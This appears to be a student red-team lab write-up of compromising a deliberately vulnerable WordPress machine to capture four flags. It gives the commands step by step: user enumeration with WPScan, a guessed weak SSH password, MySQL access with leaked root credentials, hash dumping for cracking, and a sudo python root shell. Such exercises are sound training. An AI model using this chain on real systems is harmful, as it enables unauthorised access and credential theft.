# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV 192.168.1.110/24
```

This scan identifies the services below as potential points of entry:
- Target 1
  - port 22/SSH OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)

  - port 80/http Apache httpd 2.4.10 ((Debian)) 

  - port 111/rcpbind 2-4 (RPC#100000)

  - port 139 netbios-ssn Samba smbd 3.X-4.X (workgroup: WORKGROUP)

  - port 445 netbios-ssn Samba smbd 3.X-4.X (workgroup: WORKGROUP)

    ![image-20210823135345752](C:\Users\Jim Filsinger\AppData\Roaming\Typora\typora-user-images\image-20210823135345752.png)



The following vulnerabilities were identified on each target:
- Target 1
  - CVE-2019-12215 Full Path Disclosure (192.168.1.110/var/www/html/vendor)
  - CVE-2019-15653 html password disclosure - Password hash is visible in plaintext (192.168.1.110/service.html)
  - CVE-2017-7760 exposed username which allowed brute force of password information. User access to the wp-config.php file via nano. This exposed the root user and password.
  - CVE-2008-5161 ssh remote login was active at the user level with port 22 being open



### Exploitation
_TODO: Fill out the details below. Include screenshots where possible._

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: _**b9bbcb33ellb80be759c4e844862482d**_![image-20210823145824135](C:\Users\Jim Filsinger\AppData\Roaming\Typora\typora-user-images\image-20210823145824135.png)
    
    - **Exploit Used**
      - WPScan to enumerate users of the Target 1 WordPress site
      - `$ wpscan --url http://192.168.1.110 --enumerate u`
      
      ![image-20210823130851383](C:\Users\Jim Filsinger\AppData\Roaming\Typora\typora-user-images\image-20210823130851383.png)![image-20210823130931761](C:\Users\Jim Filsinger\AppData\Roaming\Typora\typora-user-images\image-20210823130931761.png)![image-20210823140752395](C:\Users\Jim Filsinger\AppData\Roaming\Typora\typora-user-images\image-20210823140752395.png)![image-20210823140816805](C:\Users\Jim Filsinger\AppData\Roaming\Typora\typora-user-images\image-20210823140816805.png)
  
  - Targeting user Michael
    - Small manual Brute Force attack to guess/finds Michael’s password
    - User password is so weak, so obvious
    - Password: michael
  
  
  
  - `flag2.txt`: **fc3fd58dcdad9ab23faca6e9a3e581c**
    - **Exploit Used**
      - _TODO: **OpenSSH**_
      - `ssh michael@192.168.1.110`
      - `pw: michael`
      - `ls -l`
      - From the root directory`find . f -iname "*flag*"`
      - found flag2.txt in /var/www
      - `cat flag2.txt`![image-20210823141012328](C:\Users\Jim Filsinger\AppData\Roaming\Typora\typora-user-images\image-20210823141012328.png)





- **Flag3: afc01ab56b50591e7dccf93122770cd2**

- **Exploit Used:**

  Accessing MySQL database.

  - Found wp-config.php accessed database using Michael's login. MySQL was then used to traverse the database.

    ![img](https://lh4.googleusercontent.com/LTSv639ft89XswoJ-_amaYKWEOj1Amw1ZUHisZIpgwrj1pEDtUXAe8djKBJk2eZjjRe7q7IeVAtOqM5oVwE3MwOTWsmiQ2oTTOg2z2fFmx5OLWunmZy0yXT6loUtNhQtqbSBMH78=s0)

    

  - Flag 3 was found in wp_posts table in the wordpress database using these commands:

    - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1`

    - `show databases;`

    - `use wordpress;`

    - `show tables;`

    - `select * from wp_posts;`![img](https://lh5.googleusercontent.com/PrBsnB1Qnl8IgpX82z32ubX4eFfD4hXN5_BLvMpR4xXSsj61x544-G3VQ1Id70S0CQ_-m6QPLQ3PSP_FwkEiJ0U7HAdj8LRknHJKgksAJwmQXRWKlTEc5UUvqsetMWUdaiUbkyrw=s0)

      

      

      

  - **Flag4: 715dea6c055b9fe3337544932f2941ce**

  - Exploit Used:

    - Unsalted password hash and the use of privilege escalation with Python.

    - Capturing Flag 4: Retrieve user credentials from database, crack password hash with John the Ripper and use Python to gain root privileges.

      - Once having gained access to the database credentials as Michael from the wp-config.php file, lifting username and password hashes using MySQL was next.

      - These user credentials are stored in the wp_users table of the wordpress database. The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.

        - Commands:

          - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1`
          - `show databases;`
          - `use wordpress;`
          - `show tables;`
          - `select * from wp_users;`
          - ![image-20210823151033747](C:\Users\Jim Filsinger\AppData\Roaming\Typora\typora-user-images\image-20210823151033747.png)

        - Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python

          - Commands:

            - `ssh steven@192.168.1.110`
            - `pw:pink84`
            - `sudo -l`
            - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
            - `cd /root`
            - `ls`
            - `cat flag4.txt`

            ![image-20210823150644630](C:\Users\Jim Filsinger\AppData\Roaming\Typora\typora-user-images\image-20210823150644630.png)

